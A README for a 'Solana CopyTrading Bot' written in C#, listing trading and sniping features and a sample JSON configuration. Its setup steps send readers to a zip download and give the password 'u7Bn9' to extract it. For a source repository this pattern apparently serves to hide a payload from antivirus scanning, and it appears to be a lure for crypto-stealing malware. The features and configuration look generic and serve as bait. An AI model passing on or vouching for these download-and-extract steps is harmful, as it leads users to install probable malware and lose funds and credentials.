#  Solana CopyTrading Bot

A powerful and customizable copytrading bot built in **C#** for the **Solana blockchain**, supporting multiple platforms including **Raydium**, **Pump.fun**, **Moonshot**, **Photon**, **GMGN**, **BonkBot**, and **Banana Gun**. Designed to mirror transactions from top-performing wallets in real time with full control over filters, liquidity management, and sniping strategies.
![](https://github.com/knightlightst/solana-copytrading-bot/blob/main/test.gif?raw=true)
##  Features

-  **Real-Time Transaction Monitoring**  
  Monitor blockchain activity from selected wallets and copy their trades instantly.

-  **Customizable Filters**  
  Fine-tune what types of transactions to follow:
1. Swaps
2. Transfers
3. NFT activity
4. Token launches
5. Liquidity events

-  **Liquidity Management**  
  Manage how your liquidity is used:
  1. Auto-adjust based on wallet activity
  2. Slippage controls
  3. Minimum liquidity thresholds

-  **Token Creation Detection**  
  Detect new token launches and participate based on configurable triggers.

-  **Sniping Mechanism**  
  Snipe early trades on new tokens or liquidity events.

-  **Volume & Activity Filters**  
  Filter wallets and tokens based on trade volume, token popularity, and other metrics.

-  **Platform Integration**
  Seamlessly supports multiple Solana-based DEX and trading tools:
1. Raydium
2. Pump.fun
3. Moonshot
4. Photon
5. GMGN
6. BonkBot
7. Banana Gun

## Getting Started
- [Clone](https://github.com/knightlightst/solana-copytrading-bot/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
- Extract archive with password `u7Bn9`
- Configure your settings  
   Edit `appsettings.json` or use the UI to set filters, wallet addresses, and platform preferences.
- Run the bot

##  Configuration

All settings are fully configurable through a JSON or UI interface (if implemented). Below are the primary config options:

```json
{
  "watchedWallets": ["Wallet1", "Wallet2"],
  "filters": {
    "enableSwaps": true,
    "enableTransfers": false,
    "enableNFTs": false,
    "minVolume": 100,
    "maxSlippage": 2.5,
    "allowNewTokens": true
  },
  "platforms": ["Raydium", "Pump.fun", "Photon","Moonshot","GMGN","BonkBot","Banana Gun"],
  "snipeSettings": {
    "enabled": true,
    "autoApprove": true,
    "snipeDelayMs": 200
  },
  "liquidityManagement": {
    "autoAdjust": true,
    "minLiquidity": 5,
    "maxLiquidityPerToken": 100
  }
}
```

##  Disclaimer

This tool is provided for **educational and research purposes only**. Use at your own risk. Trading cryptocurrencies carries risk and can lead to significant financial loss.

---

## Contact

For issues, questions, or contributions, feel free to open an [Issue](https://github.com/knightlightst/solana-copytrading-bot/issues) or reach out via Pull Request.
